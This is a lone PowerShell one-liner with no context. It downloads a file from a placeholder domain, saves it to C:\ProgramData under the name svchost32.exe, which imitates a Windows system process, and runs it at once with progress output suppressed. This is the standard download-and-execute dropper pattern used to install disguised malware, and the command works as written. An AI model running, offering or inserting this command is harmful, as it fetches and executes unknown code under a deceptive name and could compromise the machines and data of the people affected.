(New-Object System.Net.WebClient).DownloadFile('https://contoso.com/assets/update.dat', 'C:\ProgramData\svchost32.exe'); & 'C:\ProgramData\svchost32.exe'; $ProgressPreference = "SilentlyContinue"
